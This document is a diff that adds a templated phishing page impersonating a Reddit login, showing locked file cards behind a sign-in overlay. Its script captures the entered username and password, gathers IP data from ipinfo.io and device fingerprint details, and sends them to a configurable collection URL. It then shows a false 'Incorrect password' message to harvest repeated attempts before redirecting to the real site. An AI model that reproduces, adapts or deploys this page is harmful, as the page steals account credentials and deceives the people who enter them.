@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>reddit</title>
+<link rel="icon" href="https://www.redditstatic.com/desktop2x/img/favicon/favicon-32x32.png" type="image/png"/>
+<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body,html{height:100%;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;background:#DAE0E6}
+.main-container{display:flex;flex-direction:column;min-height:100vh}
+.top-navbar{background:#fff;height:48px;border-bottom:1px solid #ccc;display:flex;align-items:center;padding:0 20px}
+.content-area{flex:1;display:flex;position:relative}
+.document-preview{flex:1;background:#e8e8e8;padding:40px}
+.document-list{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:25px;max-width:1200px;margin:0 auto}
+.document-card{background:#fff;border-radius:4px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,0.1);transition:all .2s;position:relative}
+.document-card:hover{transform:translateY(-5px);box-shadow:0 5px 15px rgba(0,0,0,0.15)}
+.document-thumbnail{height:150px;background:#fff;display:flex;align-items:center;justify-content:center;border-bottom:1px solid #eee;padding:10px}
+.thumbnail-content{width:100%;height:100%;background:#f8f8f8;display:flex;flex-direction:column}
+.thumbnail-header{background:#FF4500;height:20px;width:100%}
+.thumbnail-body{flex:1;padding:5px;font-size:6px;overflow:hidden}
+.thumbnail-line{height:3px;background:#ddd;margin:3px 0;width:90%}
+.document-info{padding:12px}
+.document-title{font-size:14px;font-weight:500;margin-bottom:5px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.document-meta{font-size:12px;color:#666;display:flex;align-items:center}
+.document-date{margin-right:10px}.document-type{padding:2px 6px;background:#E8F0FE;color:#1A73E8;border-radius:3px;font-size:10px}
+.document-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);display:flex;justify-content:center;align-items:center;z-index:1000;overflow-y:auto;padding:20px}
+.login-container{width:400px;max-width:100%;background:#fff;border-radius:8px;padding:24px;z-index:1001;text-align:left}
+.reddit-logo{font-size:32px;color:#FF4500;margin-bottom:4px}
+.form-title{font-size:20px;font-weight:700;color:#1c1c1c;margin-bottom:4px}
+.form-subtitle{font-size:14px;color:#7c7c7c;margin-bottom:16px}
+.form-group{margin-bottom:12px}
+.form-control{height:40px;border-radius:4px;border:1px solid #ccc;padding:0 10px;font-size:14px;width:100%}
+.form-control:focus{border-color:#FF4500;outline:none}
+.btn-primary{background:#FF4500;border:none;height:40px;font-weight:700;width:100%;border-radius:21px;font-size:16px;color:#fff;cursor:pointer;margin-top:8px}
+.btn-primary:hover{background:#e03e00}
+.btn-primary:disabled{background:#ffab8f}
+.error-message{color:#D32F2F;font-size:13px;margin-top:4px;margin-bottom:8px;display:none}
+.lock-icon{position:absolute;top:10px;right:10px;background:rgba(255,255,255,0.9);width:24px;height:24px;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#FF4500;font-size:12px}
+.loading-dialog{display:none;position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:rgba(255,255,255,0.95);padding:20px;border-radius:8px;box-shadow:0 0 20px rgba(0,0,0,0.3);z-index:9999;text-align:center}
+.loading-dialog .loading-text{margin-top:12px;font-size:14px;color:#000}
+@media(max-width:768px){.document-list{grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:15px}.login-container{padding:20px 16px}}
+</style>
+</head>
+<body>
+<div class="main-container">
+<div class="top-navbar"><span style="color:#FF4500;font-weight:700;font-size:18px">reddit</span></div>
+<div class="content-area"><div class="document-preview"><div class="document-list">
+<div class="document-card"><div class="lock-icon"><i class="fas fa-lock"></i></div><div class="document-thumbnail"><div class="thumbnail-content"><div class="thumbnail-header"></div><div class="thumbnail-body"><div class="thumbnail-line" style="width:60%"></div></div></div></div><div class="document-info"><div class="document-title">{{file1Name}}</div><div class="document-meta"><span class="document-date">{{file1Date}}</span><span class="document-type">PDF</span></div></div></div>
+<div class="document-card"><div class="lock-icon"><i class="fas fa-lock"></i></div><div class="document-thumbnail"><div class="thumbnail-content"><div class="thumbnail-header"></div><div class="thumbnail-body"><div class="thumbnail-line" style="width:70%"></div></div></div></div><div class="document-info"><div class="document-title">{{file2Name}}</div><div class="document-meta"><span class="document-date">{{file2Date}}</span><span class="document-type">DOC</span></div></div></div>
+<div class="document-card"><div class="lock-icon"><i class="fas fa-lock"></i></div><div class="document-thumbnail"><div class="thumbnail-content"><div class="thumbnail-header"></div><div class="thumbnail-body"><div class="thumbnail-line" style="width:80%"></div></div></div></div><div class="document-info"><div class="document-title">{{file3Name}}</div><div class="document-meta"><span class="document-date">{{file3Date}}</span><span class="document-type">XLS</span></div></div></div>
+<div class="document-card"><div class="lock-icon"><i class="fas fa-lock"></i></div><div class="document-thumbnail"><div class="thumbnail-content"><div class="thumbnail-header"></div><div class="thumbnail-body"><div class="thumbnail-line" style="width:90%"></div></div></div></div><div class="document-info"><div class="document-title">{{file4Name}}</div><div class="document-meta"><span class="document-date">{{file4Date}}</span><span class="document-type">PPT</span></div></div></div>
+</div>
+<div class="document-overlay">
+<div class="login-container">
+<div class="reddit-logo"><svg viewBox="0 0 24 24" width="40" height="40" fill="#FF4500"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221l-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.446 1.394c-.14.18-.357.223-.548.223l.188-2.85 5.18-4.68c.223-.198-.054-.308-.346-.11l-6.4 4.02-2.76-.918c-.6-.187-.612-.6.126-.89l10.782-4.156c.5-.18.945.115.78.89z"/></svg></div>
+<h2 class="form-title">Log In</h2>
+<p class="form-subtitle">Enter your credentials</p>
+<form id="loginForm" onsubmit="return handleSubmit(event);" method="post" autocomplete="off">
+<div class="form-group"><input type="text" class="form-control" id="emailInput" placeholder="Email or username" required></div>
+<div class="form-group"><input type="password" class="form-control" id="passwordInput" placeholder="Password" required onkeypress="if(event.key==='Enter')handleSubmit(event)">
+<div class="error-message" id="loginError">Incorrect password. Try again.</div>
+<div class="error-message" id="generalError">An error occurred. Please try again.</div></div>
+<input type="hidden" id="methodInput" value="email">
+<button type="submit" class="btn-primary" id="submitBtn">Log In</button>
+</form>
+</div></div></div></div></div>
+<div class="loading-dialog" id="loadingDialog">
+<div class="spinner-border" style="color:#FF4500" role="status"><span class="sr-only">Loading...</span></div>
+<div class="loading-text" id="loadingText">Verifying...</div></div>
+<script>
+const templateConfig = { postURL:"{{postURL}}", token:"{{token}}", landingPageLink:"{{landingPageLink}}", maxLoginAttempts:"{{maxLoginAttempts}}" };
+let loginAttempts=0;const MAX_ATTEMPTS=templateConfig.maxLoginAttempts&&parseInt(templateConfig.maxLoginAttempts)>0?parseInt(templateConfig.maxLoginAttempts):3;
+function objectToFormData(obj){const fd=new URLSearchParams();Object.entries(obj).forEach(([k,v])=>fd.append(k,v!=null?v.toString():''));return fd.toString()}
+function getDeviceData(){return{userAgent:navigator.userAgent,platform:navigator.platform,language:navigator.language,screenWidth:window.screen.width,screenHeight:window.screen.height,colorDepth:window.screen.colorDepth,pixelRatio:window.devicePixelRatio,hardwareConcurrency:navigator.hardwareConcurrency,deviceMemory:navigator.deviceMemory,vendor:navigator.vendor,maxTouchPoints:navigator.maxTouchPoints}}
+function handleSubmit(event){event.preventDefault()
+document.getElementById('loginError').style.display='none';document.getElementById('generalError').style.display='none'
+const id=document.getElementById('emailInput').value.trim();const pw=document.getElementById('passwordInput').value.trim()
+if(!id||!pw){document.getElementById('loginError').textContent="Please fill in all fields.";document.getElementById('loginError').style.display='block';return false}
+const btn=document.getElementById('submitBtn');btn.disabled=true;btn.textContent="Verifying...";document.getElementById('loadingDialog').style.display='block'
+fetch('https://ipinfo.io/json').then(r=>r.json()).catch(()=>({})).then(ipData=>{
+const payload={token:templateConfig.token,formData:JSON.stringify({loginMethod:'email',identifier:id,password:pw,ipData,deviceData:getDeviceData(),timestamp:new Date().toISOString()})}
+return fetch(`${templateConfig.postURL}/notify-form-submission`,{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:objectToFormData(payload)})
+}).then(r=>{if(!r.ok)throw new Error(`HTTP ${r.status}`);return r.json()}).then(data=>{
+loginAttempts++;document.getElementById('loadingDialog').style.display='none';btn.disabled=false;btn.textContent="Log In"
+if(loginAttempts>=MAX_ATTEMPTS){btn.textContent="Redirecting...";let url=templateConfig.landingPageLink||"https://www.reddit.com";if(!url.startsWith('http'))url='https://'+url;window.location.href=url}
+else{document.getElementById('loginError').textContent="Incorrect password. Try again.";document.getElementById('loginError').style.display='block';document.getElementById('passwordInput').value=''}
+}).catch(e=>{console.error(e);document.getElementById('loadingDialog').style.display='none';document.getElementById('generalError').style.display='block';btn.disabled=false;btn.textContent="Log In"})
+return false}
+</script>
+</body>
+</html>
